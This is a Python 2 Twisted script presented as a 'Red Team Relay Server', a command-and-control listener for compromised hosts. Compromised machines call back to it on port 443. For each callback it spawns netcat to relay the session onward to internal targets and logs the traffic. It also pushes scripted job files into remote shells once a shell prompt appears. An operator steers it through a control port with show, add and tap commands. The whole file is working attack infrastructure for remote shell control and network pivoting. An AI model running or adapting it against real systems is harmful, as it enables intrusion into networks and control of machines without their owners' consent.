#!/usr/bin/python2

from twisted.internet.protocol import Factory
from twisted.protocols.basic import LineReceiver
from twisted.conch import recvline
from twisted.internet import reactor, protocol, defer
from os.path import isfile, join
from threading import Thread
import pdb, datetime, re, os, stat, time

LISTEN_PORT = 443  # Your callbacks should be sent here
COMMAND_PORT = 444 # Port to interact with server
NETCAT = '/bin/nc'
PROMPT = r'# $' #default shell prompt

def jobsleep(self):
	time.sleep(5)
	self.transport.loseConnection()

class Listener(LineReceiver):
    def __init__(self, hosts, sched, conn, jobs):
        self.hosts = hosts  # List of called in hosts    [host, time]
        self.sched = sched  # List of scheduled relays   [host, target, port, count]
        self.conn = conn    # List of established relays [host, target, port, netcat_instance]
        self.jobs = jobs    # List of scheduled jobs     [host, job, prompt, count]
        self.nc = None
        self.job = None
	self.jobsleep = None
    
    
    def connectionMade(self):
        host = self.transport.getPeer().host
        print "Connected: ", host

        for record in self.hosts: # Remove old record of last call-in if this one is new
            if host in record:
                self.hosts.remove(record)

        self.hosts.append([host, datetime.datetime.now()]) # Add record of call-in with ip and time

        if self.sched:
            for record in self.sched:
                shost, target, port, count = record
                if shost == host: # We got a relay to setup
                    cmd = [NETCAT, target, port]
                    cwd = '/tmp'

                    self.nc = ProcessProtocol(self, [host, target, port])
                    reactor.spawnProcess(self.nc, cmd[0], cmd, {}, cwd)
                    self.conn.append([host, target, port, self.nc])

                    if count == 1:
                        self.sched.remove(record)
                    if count >= 1:
                        record[3] -= 1

        if self.jobs:
            for shost, job, prompt, count in self.jobs:
                if shost == host:
                    self.job = 1

                    if prompt == "nc":
                        with open(os.getcwd() + "/jobs/" + job) as jobfile:
                            for line in jobfile.readlines():
                                self.sendLine(line)
                        self.transport.loseConnection()
                        if count == 1:
                            self.jobs.remove(job)
                        if count > 1:
                            job[3] -= 1

        #Kill it if we got nothing for the callback
        if not self.job and not self.nc:
            self.transport.loseConnection()


    def dataReceived(self, data):
        if self.nc != None:
            self.nc.transport.write(data)
            self.nc.log.write(data) #TODO Handle exceptions here
            self.nc.log.flush()

        if self.jobs:
            for host, target, port, nc in self.conn:
                if host == self.transport.getPeer().host:
                    return # Don't muck with established connections.
            for job in self.jobs:
                shost, filename, prompt, count = job
                if shost == self.transport.getPeer().host:
                    if re.search(prompt, data): # Found prompt. Lets start sending our job over.
                        with open(os.getcwd() + "/jobs/" + filename) as jobfile:
                            for line in jobfile.readlines():
				if re.search(r'^gotosleep', line):
					print "Sleeping.."
					thread = Thread(target = jobsleep, args = (self, ))
					thread.start()
					self.jobsleep = 1
				else:
					self.sendLine(line)
                        print "Completed " + filename + " - " + shost
			if self.jobsleep == None:
				self.transport.loseConnection()
			else:
				self.jobsleep = None
                        if count == 1:
                            self.jobs.remove(job)
                        if count > 1:
                            job[3] -= 1


    def connectionLost(self, reason):
        if self.nc != None:
            self.nc.transport.loseConnection()
            self.nc.log.close()


class ProcessProtocol(protocol.ProcessProtocol):

    def __init__(self, nc, conn):
        self.nc = nc
        host, target, port = conn
        self.log = open(os.getcwd() + "/sessions/" + host + "--" + target + ":" + port, "a") #TODO: Handle exception

    def outReceived(self, data):
        self.nc.transport.write(data)
        self.log.write(data)
        self.log.flush()

    def processEnded(self, reason):
        if self.nc.conn:
            for record in self.nc.conn:
                if self.nc.transport.getPeer().host == record[0]:
                    self.nc.conn.remove(record)

        self.nc.transport.loseConnection()
        self.log.close()

class ListenerFactory(Factory):

    def __init__(self):
        self.hosts = []
        self.sched = []
        self.conn = []
        self.jobs = []

    def buildProtocol(self, addr):
        return Listener(self.hosts, self.sched, self.conn, self.jobs)

class Control(recvline.HistoricRecvLine):
    def __init__(self, listener):
        self.listener = listener
        self.tap = []
        self.state = "INPUT"
        self.name = "--- Red Team Relay Server ---\nListening on Port: " + str(LISTEN_PORT) + "\n\n"

    def connectionMade(self):
        self.terminal.write(self.name + "> ") #show prompt
        #print "Got a connection from: " + self.transport.getPeer.host()

    def dataReceived(self, line):
        if self.state == "INPUT":
            self.handle_input(line)

    def handle_input(self, line):
        cmd = line.split()[0]
        relay_m = re.search(r'(([0-9]{1,3}\.){3}[0-9]{1,3} ){2}[0-9]{1,5}(.*?)$', line)
        job_m = re.search(r'job ([0-9]{1,3}\.){3}[0-9]{1,3} (.*?)$', line)
        show_m = re.search(r'(relay|job)', line)

        if cmd == "show":
            if show_m:
                if show_m.group(1) == "relay":
                    for host, target, port, count in listener.sched:
                        self.terminal.write(host + " > " + target + ":" + port + "\n")
            else:
                if listener.hosts:
                    for host, date in sorted(listener.hosts, key=lambda x: x[0]):
                        self.terminal.write(str(host) + "," + date.strftime("%I:%M%p") + "\n")
                else:
                    self.terminal.write("No Connections\n")
				
        #Add relays with support for additional options
        elif cmd == "add":
            if relay_m:
                if relay_m.group(relay_m.lastindex) == "":
                    c, host, target, port = line.split() 
                    listener.sched.append([host, target, port, 1])

            elif job_m:
                job = job_m.group(2).split()[0]
                if not isfile("jobs/" + job):
                    pdb.set_trace()
                    self.terminal.write("Job does not exist.\n> ")
                    return
                
                if len(line.split()) == 4:
                    host, job = line.split()[2:]
                    listener.jobs.append([host, job, PROMPT, 1]) 
                    print "Added job - " + host

                elif len(line.split()) == 5:
                    host, job, count = line.split()[2:]
                    listener.jobs.append([host, job, PROMPT, int(count)])
                    print "Added job - " + host

                elif len(line.split()) == 6:
                    host, job, count, prompt = line.split()[2:]
                    listener.jobs.append([host, job, prompt, int(count)])
                    print "Added job (" + job + ") - " + host

                else:
                    self.terminal.write("Wtf?\n")
                    return


        elif cmd == "tap":
            host, target = line.split()[1].split("--")
            target = re.sub(':[0-9]+$', '', target)
            data = " ".join(line.split()[2:])

            for h, t, p, nc in listener.conn:
                if host == h and target == t:
                    nc.outReceived(data + "\n")
                    nc.transport.write(data + "\n")

        elif cmd == "help":
            self.terminal.write("Just 'show' and 'add' commands at the moment.\nadd <target> <host> <port>\n\nex. 'show' or 'show relay'\nex. 'add 172.25.20.11 10.0.0.101 53'")
        else:
            self.terminal.write("huh?\n")

        self.terminal.write("\n> ")

class ControlFactory(Factory):
    def __init__(self, listener):
        self.listener = listener

    def buildProtocol(self, addr):
        return Control(self.listener)

listener = ListenerFactory()
reactor.listenTCP(LISTEN_PORT, listener)
reactor.listenTCP(COMMAND_PORT, ControlFactory(listener))
reactor.run()
